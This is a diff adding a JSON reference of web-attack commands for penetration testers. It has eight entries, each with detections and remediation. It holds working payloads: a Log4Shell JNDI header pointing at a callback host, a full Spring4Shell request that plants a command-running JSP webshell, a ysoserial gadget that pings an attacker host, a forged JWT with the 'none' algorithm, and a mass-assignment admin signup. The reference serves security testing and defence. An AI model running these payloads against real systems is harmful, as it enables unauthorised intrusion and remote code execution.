@@ -1,0 +1,414 @@
+[
+  {
+    "id": "burp-collaborator",
+    "tool": "burpsuite",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "# Burp Collaborator: Generate payload\n# Insert: ${jndi:ldap://xyz.burpcollaborator.net/a}\n# Check Collaborator tab for callbacks",
+    "name": "Blind Vulnerability Detection (Collaborator)",
+    "description": "Uses out-of-band callbacks to detect blind vulnerabilities (SSRF, XXE, Log4Shell).",
+    "arguments": {
+      "Collaborator": "Burp's callback server"
+    },
+    "expected_output": "[+] DNS lookup received from target\n[+] HTTP request received \u2192 confirms blind SSRF",
+    "use_case": "Detect blind vulnerabilities that don't show output in responses.",
+    "prerequisites": [
+      "Burp Suite Pro",
+      "Target can make outbound requests"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Outbound DNS/HTTP to unusual domains"
+    ],
+    "remediation": [
+      "Egress filtering",
+      "Block unnecessary outbound"
+    ],
+    "common_mistakes": [
+      "Target can't make outbound requests"
+    ],
+    "alternatives": [
+      "interactsh (free alternative)",
+      "webhook.site"
+    ],
+    "references": [
+      "https://portswigger.net/burp/documentation/collaborator"
+    ],
+    "tags": [
+      "blind",
+      "oob",
+      "collaborator",
+      "ssrf",
+      "detection"
+    ]
+  },
+  {
+    "id": "interactsh-oob",
+    "tool": "interactsh",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "interactsh-client",
+    "name": "Out-of-Band Testing (Free)",
+    "description": "Free alternative to Burp Collaborator \u2014 generates unique URLs for blind vulnerability detection.",
+    "arguments": {
+      "interactsh-client": "Start client, get unique URL"
+    },
+    "expected_output": "[+] URL: abc123.interact.sh\n[+] Received DNS query from 10.0.0.5\n[+] Received HTTP request from target",
+    "use_case": "Detect blind SSRF, XXE, command injection via out-of-band callbacks.",
+    "prerequisites": [
+      "interactsh installed",
+      "Target can make outbound requests"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Outbound requests to interact.sh domains"
+    ],
+    "remediation": [
+      "Egress filtering"
+    ],
+    "common_mistakes": [
+      "No outbound connectivity from target"
+    ],
+    "alternatives": [
+      "Burp Collaborator",
+      "webhook.site",
+      "dnslog.cn"
+    ],
+    "references": [
+      "https://github.com/projectdiscovery/interactsh"
+    ],
+    "tags": [
+      "oob",
+      "blind",
+      "free",
+      "callback",
+      "detection"
+    ]
+  },
+  {
+    "id": "log4shell-test",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl -H 'X-Api-Version: ${jndi:ldap://<callback>/a}' http://<target>/",
+    "name": "Log4Shell Test (CVE-2021-44228)",
+    "description": "Tests for Log4j RCE by injecting JNDI lookup in various headers.",
+    "arguments": {
+      "${jndi:ldap://...}": "Log4j JNDI lookup payload",
+      "X-Api-Version": "Header likely to be logged"
+    },
+    "expected_output": "# If vulnerable: DNS/LDAP callback received at your server",
+    "use_case": "Test for one of the most critical vulnerabilities ever \u2014 affects Java applications using Log4j.",
+    "prerequisites": [
+      "Java application",
+      "Callback server (interactsh)"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "JNDI lookup strings in logs",
+      "Outbound LDAP connections"
+    ],
+    "remediation": [
+      "Update Log4j to 2.17+",
+      "Set log4j2.formatMsgNoLookups=true"
+    ],
+    "common_mistakes": [
+      "Not Java application",
+      "Already patched"
+    ],
+    "alternatives": [
+      "nuclei -t cves/2021/CVE-2021-44228",
+      "log4j-scan"
+    ],
+    "references": [
+      "https://www.lunasec.io/docs/blog/log4j-zero-day/"
+    ],
+    "tags": [
+      "log4shell",
+      "log4j",
+      "jndi",
+      "rce",
+      "critical",
+      "cve"
+    ]
+  },
+  {
+    "id": "spring4shell-test",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl -X POST http://<target>/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'",
+    "name": "Spring4Shell Test (CVE-2022-22965)",
+    "description": "Tests for Spring Framework RCE via class loader manipulation.",
+    "arguments": {
+      "POST data": "ClassLoader manipulation payload"
+    },
+    "expected_output": "# If vulnerable: JSP webshell created on server",
+    "use_case": "Test Spring Framework applications for critical RCE vulnerability.",
+    "prerequisites": [
+      "Spring Framework application",
+      "JDK 9+",
+      "Tomcat deployment"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Unusual POST parameters",
+      "ClassLoader manipulation in logs"
+    ],
+    "remediation": [
+      "Update Spring Framework",
+      "Use WAF rules"
+    ],
+    "common_mistakes": [
+      "Not Spring/not Tomcat/patched"
+    ],
+    "alternatives": [
+      "nuclei -t cves/2022/CVE-2022-22965"
+    ],
+    "references": [
+      "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
+    ],
+    "tags": [
+      "spring4shell",
+      "spring",
+      "rce",
+      "cve",
+      "java"
+    ]
+  },
+  {
+    "id": "deserialization-ysoserial",
+    "tool": "ysoserial",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "java -jar ysoserial.jar CommonsCollections1 'ping <attacker>' | base64",
+    "name": "Java Deserialization Payload",
+    "description": "Generates Java deserialization payloads for RCE in vulnerable applications.",
+    "arguments": {
+      "CommonsCollections1": "Gadget chain",
+      "'ping <attacker>'": "Command to execute",
+      "base64": "Encode for injection"
+    },
+    "expected_output": "# Base64 payload for injection into deserialization points",
+    "use_case": "Exploit Java deserialization vulnerabilities for remote code execution.",
+    "prerequisites": [
+      "Java application with deserialization",
+      "Vulnerable library in classpath"
+    ],
+    "mitre_mapping": [
+      "T1059"
+    ],
+    "mitre_tactic": "Execution",
+    "detections": [
+      "Deserialization errors",
+      "Unusual object types in traffic"
+    ],
+    "remediation": [
+      "Don't deserialize untrusted data",
+      "Use allowlists for classes"
+    ],
+    "common_mistakes": [
+      "Wrong gadget chain for target libraries"
+    ],
+    "alternatives": [
+      "marshalsec",
+      "JNDI-Injection-Exploit"
+    ],
+    "references": [
+      "https://github.com/frohoff/ysoserial"
+    ],
+    "tags": [
+      "deserialization",
+      "java",
+      "rce",
+      "gadget-chain"
+    ]
+  },
+  {
+    "id": "wfuzz-auth-bypass",
+    "tool": "wfuzz",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "wfuzz -c -z file,/usr/share/seclists/Fuzzing/Unicode.txt -u http://<target>/admin/FUZZ --hc 403",
+    "name": "Path Traversal / Auth Bypass Fuzzing",
+    "description": "Fuzzes URL paths with Unicode and special characters to bypass access controls.",
+    "arguments": {
+      "-z file": "Payload source",
+      "--hc 403": "Hide 403 (blocked)"
+    },
+    "expected_output": "200  /admin/%2e%2e/config\n200  /admin/..;/dashboard",
+    "use_case": "Bypass 403 restrictions using path normalization tricks.",
+    "prerequisites": [
+      "403 on restricted path"
+    ],
+    "mitre_mapping": [
+      "T1190"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "Unusual URL encoding in logs",
+      "Path traversal patterns"
+    ],
+    "remediation": [
+      "Normalize paths before ACL check",
+      "Use allowlists"
+    ],
+    "common_mistakes": [
+      "All bypasses blocked"
+    ],
+    "alternatives": [
+      "403bypasser",
+      "byp4xx"
+    ],
+    "references": [
+      "https://github.com/xmendez/wfuzz"
+    ],
+    "tags": [
+      "auth-bypass",
+      "403",
+      "path-traversal",
+      "unicode",
+      "fuzzing"
+    ]
+  },
+  {
+    "id": "api-jwt-none",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "# Change JWT header algorithm to 'none':\n# {\"alg\":\"none\",\"typ\":\"JWT\"}\n# Remove signature\ncurl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' http://<target>/api/admin",
+    "name": "JWT Algorithm None Attack",
+    "description": "Exploits JWT implementations that accept 'none' algorithm \u2014 bypasses signature verification.",
+    "arguments": {
+      "alg: none": "No signature required"
+    },
+    "expected_output": "{\n  \"status\": \"success\",\n  \"user\": \"admin\"\n}",
+    "use_case": "Bypass JWT authentication by setting algorithm to 'none' \u2014 removes signature requirement.",
+    "prerequisites": [
+      "JWT-based authentication",
+      "Server accepts 'none' algorithm"
+    ],
+    "mitre_mapping": [
+      "T1078"
+    ],
+    "mitre_tactic": "Initial Access",
+    "detections": [
+      "JWT with 'none' algorithm",
+      "Missing signature"
+    ],
+    "remediation": [
+      "Reject 'none' algorithm",
+      "Validate algorithm server-side"
+    ],
+    "common_mistakes": [
+      "Server properly validates algorithm"
+    ],
+    "alternatives": [
+      "jwt_tool -T",
+      "manual base64 editing"
+    ],
+    "references": [
+      "https://portswigger.net/web-security/jwt"
+    ],
+    "tags": [
+      "jwt",
+      "none",
+      "algorithm",
+      "bypass",
+      "authentication"
+    ]
+  },
+  {
+    "id": "api-mass-assignment",
+    "tool": "curl",
+    "category": "web_testing",
+    "phase": 4,
+    "os": [
+      "linux",
+      "windows",
+      "macos"
+    ],
+    "command": "curl -X POST http://<target>/api/register -H 'Content-Type: application/json' -d '{\"username\":\"hacker\",\"password\":\"pass\",\"role\":\"admin\",\"isAdmin\":true}'",
+    "name": "Mass Assignment / Parameter Pollution",
+    "description": "Adds extra parameters to requests hoping the backend blindly assigns them to the object.",
+    "arguments": {
+      "role: admin": "Extra parameter",
+      "isAdmin: true": "Another attempt"
+    },
+    "expected_output": "{\n  \"id\": 5,\n  \"username\": \"hacker\",\n  \"role\": \"admin\"\n}",
+    "use_case": "Escalate privileges by adding hidden parameters that the API blindly accepts.",
+    "prerequisites": [
+      "API endpoint accepting JSON",
+      "Knowledge of internal field names"
+    ],
+    "mitre_mapping": [
+      "T1078"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Unexpected fields in request bodies",
+      "Role changes without admin action"
+    ],
+    "remediation": [
+      "Use DTOs/allowlists for input",
+      "Never bind request directly to model"
+    ],
+    "common_mistakes": [
+      "API properly validates fields"
+    ],
+    "alternatives": [
+      "arjun (find hidden params)",
+      "param-miner (Burp)"
+    ],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"
+    ],
+    "tags": [
+      "mass-assignment",
+      "api",
+      "privilege-escalation",
+      "parameters"
+    ]
+  }
+]
